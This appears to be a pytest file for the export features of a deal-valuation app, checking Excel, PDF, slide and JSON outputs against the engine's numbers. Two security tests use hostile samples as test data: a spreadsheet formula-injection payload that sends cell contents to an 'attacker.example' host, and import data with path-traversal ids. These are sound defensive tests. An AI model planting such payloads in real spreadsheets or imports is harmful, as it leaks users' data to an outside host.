"""Milestone 7: the Excel workbook recalculates in LibreOffice to the engine's numbers and passes its checks."""

from __future__ import annotations

import io

import pytest
from openpyxl import load_workbook
from test_financials_valuation import M, make_deal, seed_quick_scan
from test_methods_api import TRANCHES

from dealscout_api.exports.quality import ERRORS, recalculate, soffice_path


def seeded(client):
    deal = make_deal(client, listed=False)
    seed_quick_scan(client, deal["id"])
    client.put(f"/api/deals/{deal['id']}/methods/lbo", json={"tranches": TRANCHES, "entry_multiple": 9.0})
    return deal


def test_workbook_structure_and_conventions(client):
    deal = seeded(client)
    r = client.get(f"/api/deals/{deal['id']}/export/xlsx")
    assert r.status_code == 200, r.text
    assert r.headers["content-disposition"].endswith('.xlsx"')
    wb = load_workbook(io.BytesIO(r.content))
    assert wb.sheetnames[:7] == [
        "Report",
        "Financials",
        "Valuation Summary",
        "Assumptions",
        "WACC",
        "Projections",
        "DCF",
    ]
    assert "LBO" in wb.sheetnames and wb.sheetnames[-2:] == ["Sources", "Disclaimer"]
    assert "Precedents" not in wb.sheetnames  # only methods used in the deal
    assert wb.properties.creator == "DealScout (AI-generated)"
    # inputs blue, links to other tabs green, formulas black
    a = wb["Assumptions"]
    tax = next(row[1] for row in a.iter_rows(min_col=2, max_col=3) if row[0].value == "Tax rate")
    assert tax.font.color.rgb.endswith("0000FF") and tax.value == 0.3
    w = wb["WACC"]
    link = next(row[1] for row in w.iter_rows(min_col=2, max_col=3) if row[0].value == "Risk-free rate")
    assert link.value.startswith("='Assumptions'!") and link.font.color.rgb.endswith("008000")
    formulas = [
        c.value
        for ws in wb.worksheets
        for row in ws.iter_rows()
        for c in row
        if isinstance(c.value, str) and c.value.startswith("=")
    ]
    assert formulas and not any(
        f in v.upper() for v in formulas for f in ("XLOOKUP", "FILTER(", "SORT(", "UNIQUE(", "SEQUENCE(")
    )
    assert all(ws.oddFooter.left.text.startswith("AI-generated report") for ws in wb.worksheets)


@pytest.mark.skipif(soffice_path() is None, reason="LibreOffice is not installed")
def test_workbook_recalculates_to_engine_values(client):
    deal = seeded(client)
    content = client.get(f"/api/deals/{deal['id']}/export/xlsx").content
    v = client.get(f"/api/deals/{deal['id']}/valuation").json()
    recalculated = recalculate(content)
    assert recalculated is not None
    wb = load_workbook(io.BytesIO(recalculated), data_only=True)
    errors = [
        f"{ws.title}!{c.coordinate}" for ws in wb.worksheets for row in ws.iter_rows() for c in row if c.value in ERRORS
    ]
    assert errors == []
    dcf = {row[0].value: row[1].value for row in wb["DCF"].iter_rows(min_col=2, max_col=3)}
    assert dcf["Enterprise value"] == pytest.approx(v["result"]["dcf"]["enterprise_value"] / M, rel=1e-9)
    assert dcf["Equity value"] == pytest.approx(v["result"]["dcf"]["equity_value"] / M, rel=1e-9)
    summary = {row[0].value: row[2].value for row in wb["Valuation Summary"].iter_rows(min_col=2, max_col=4)}
    assert summary["Blended value (weighted)"] == pytest.approx(
        v["result"]["football_field"]["blended_equity_mid"] / M, rel=1e-9
    )

    # the live model: a higher terminal growth input raises the DCF value after recalculation
    edit = load_workbook(io.BytesIO(content))
    a = edit["Assumptions"]
    g = next(row[1] for row in a.iter_rows(min_col=2, max_col=3) if row[0].value == "Terminal growth")
    g.value = g.value + 0.005
    buf = io.BytesIO()
    edit.save(buf)
    changed = load_workbook(io.BytesIO(recalculate(buf.getvalue())), data_only=True)
    ev2 = {row[0].value: row[1].value for row in changed["DCF"].iter_rows(min_col=2, max_col=3)}["Enterprise value"]
    assert ev2 > dcf["Enterprise value"]


def test_workbook_for_an_empty_deal(client):
    deal = make_deal(client)
    r = client.get(f"/api/deals/{deal['id']}/export/xlsx")
    assert r.status_code == 200, r.text
    wb = load_workbook(io.BytesIO(r.content))
    assert "DCF" not in wb.sheetnames and wb.sheetnames[0] == "Report"


def test_pdf_tear_sheet(client):
    import pymupdf

    deal = seeded(client)
    r = client.get(f"/api/deals/{deal['id']}/export/pdf")
    assert r.status_code == 200 and r.headers["content-type"] == "application/pdf"
    doc = pymupdf.open(stream=r.content, filetype="pdf")
    assert 2 <= doc.page_count <= 6
    text = " ".join(page.get_text() for page in doc)
    assert "generated automatically by AI" in text and "Suggested acquisition price" in text
    assert "Football field" in text and "Data quality" in text and "<b>" not in text


def test_pptx_one_pager(client):
    from pptx import Presentation

    deal = seeded(client)
    r = client.get(f"/api/deals/{deal['id']}/export/pptx")
    assert r.status_code == 200
    prs = Presentation(io.BytesIO(r.content))
    assert len(prs.slides) == 1
    slide = prs.slides[0]
    text = " ".join(s.text_frame.text for s in slide.shapes if s.has_text_frame)
    assert "Acme Industrial GmbH" in text and "AI-generated report" in text and "Data quality" in text
    assert any(s.has_chart for s in slide.shapes)
    assert "generated automatically by AI" in slide.notes_slide.notes_text_frame.text


def test_json_round_trip_reproduces_results(client):
    deal = seeded(client)
    body = client.get(f"/api/deals/{deal['id']}/export/json").json()
    assert body["format"] == "dealscout.deal" and body["values"] and body["assumptions"]["methods"]["lbo"]["tranches"]
    r = client.post("/api/deals/import", json=body)
    assert r.status_code == 201, r.text
    out = r.json()
    assert out["reproduced"] is True and out["differences"] == [] and out["name"].endswith("(imported)")
    original = client.get(f"/api/deals/{deal['id']}/valuation").json()["result"]["football_field"]["blended_equity_mid"]
    copy = client.get(f"/api/deals/{out['id']}/valuation").json()["result"]["football_field"]["blended_equity_mid"]
    assert copy == original

    tampered = {**body, "results": {**body["results"], "blended_equity_mid": body["results"]["blended_equity_mid"] * 2}}
    out = client.post("/api/deals/import", json=tampered).json()
    assert out["reproduced"] is False and "blended_equity_mid" in out["differences"][0]
    assert client.post("/api/deals/import", json={**body, "format": "other"}).status_code == 422


def test_text_from_users_and_documents_never_becomes_a_formula(client):
    """Security: a deal or transaction named like a formula is written as text, while DealScout's formulas stay."""
    hostile = '=HYPERLINK("https://attacker.example/?"&A1,"Total")'
    deal = make_deal(client, name=hostile)
    seed_quick_scan(client, deal["id"])
    client.put(
        f"/api/deals/{deal['id']}/methods/precedents",
        json={"transactions": [{"announced": "2024-06-30", "target": "=1+1", "ev": 900 * M, "ebitda": 100 * M}]},
    )
    wb = load_workbook(io.BytesIO(client.get(f"/api/deals/{deal['id']}/export/xlsx").content))
    cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row]
    injected = [c for c in cells if isinstance(c.value, str) and c.value.startswith(("=HYPERLINK", "=1+1"))]
    assert injected and all(c.data_type == "s" for c in injected)
    assert any(c.data_type == "f" for c in cells)  # the model's own formulas are untouched


def test_import_ignores_ids_and_state_from_the_file(client):
    """Security: an imported file cannot choose ids, workflow state or arbitrary provenance."""
    deal = seeded(client)
    body = client.get(f"/api/deals/{deal['id']}/export/json").json()
    body["deal"] |= {"id": deal["id"], "status": "approved", "archived": True}
    body["values"][0] |= {
        "id": 1,
        "deal_id": "../../etc",
        "provenance": {"page": 3, "nested": {"x": 1}, "bbox": [1, 2, 3, 4]},
    }
    body["periods"][0] |= {"id": "../evil"}
    r = client.post("/api/deals/import", json=body)
    assert r.status_code == 201, r.text
    new = client.get(f"/api/deals/{r.json()['id']}").json()
    assert new["id"] != deal["id"] and new["archived"] is False and new["status"] == "draft"
    assert client.get(f"/api/deals/{deal['id']}").status_code == 200  # the original is untouched


@pytest.mark.skipif(soffice_path() is None, reason="LibreOffice is not installed")
@pytest.mark.parametrize("scale", [1_000, 1_000_000, 1_000_000_000])
def test_per_share_values_are_right_whatever_the_entry_scale(client, scale):
    deal = make_deal(client, listed=False)
    assert client.patch(f"/api/deals/{deal['id']}/financials/entry", json={"scale": scale}).status_code == 200
    seed_quick_scan(client, deal["id"])
    v = client.get(f"/api/deals/{deal['id']}/valuation").json()
    wb = load_workbook(
        io.BytesIO(recalculate(client.get(f"/api/deals/{deal['id']}/export/xlsx").content)), data_only=True
    )
    dcf = {row[0].value: row[1].value for row in wb["DCF"].iter_rows(min_col=2, max_col=3)}
    expected = v["result"]["dcf"]["equity_value"] / v["result"]["dcf"]["per_share"]["diluted_shares"]
    assert dcf["Value per diluted share"] == pytest.approx(expected, rel=1e-9)


def test_dlom_and_nav_tables_match_the_engine(client):
    deal = make_deal(client, listed=False)
    seed_quick_scan(client, deal["id"])
    client.put(
        f"/api/deals/{deal['id']}/methods/dlom", json={"low": 0.1, "mid": 0.2, "high": 0.3, "applies_to": "all_methods"}
    )
    client.put(
        f"/api/deals/{deal['id']}/methods/nav",
        json={"lines": [{"name": "Plant", "book_value": 100 * M, "method": "appraisal", "fair_value": 150 * M}]},
    )
    v = client.get(f"/api/deals/{deal['id']}/valuation").json()
    dcf = next(m for m in v["result"]["football_field"]["methods"] if m["method_id"] == "dcf")
    wb = load_workbook(io.BytesIO(client.get(f"/api/deals/{deal['id']}/export/xlsx").content))
    row = next(r for r in wb["Valuation Summary"].iter_rows(min_col=2, max_col=5) if r[0].value == dcf["label"])
    # the discounted mid is written as the engine's value, not a link to the undiscounted DCF
    assert row[2].value == pytest.approx(dcf["equity_mid"] / M) and row[1].value <= row[2].value <= row[3].value
    if soffice_path() is None:
        return
    values = load_workbook(
        io.BytesIO(recalculate(client.get(f"/api/deals/{deal['id']}/export/xlsx").content)), data_only=True
    )
    nav_rows = {r[0].value: r[1].value for r in values["NAV & SOTP"].iter_rows(min_col=2, max_col=3) if r[0].value}
    assert nav_rows["Revaluation gain"] == pytest.approx(50)
    assert nav_rows["Book NAV"] + nav_rows["Revaluation gain"] + nav_rows["Deferred tax on gains"] + nav_rows[
        "Holding discount"
    ] == pytest.approx(nav_rows["NAV"])
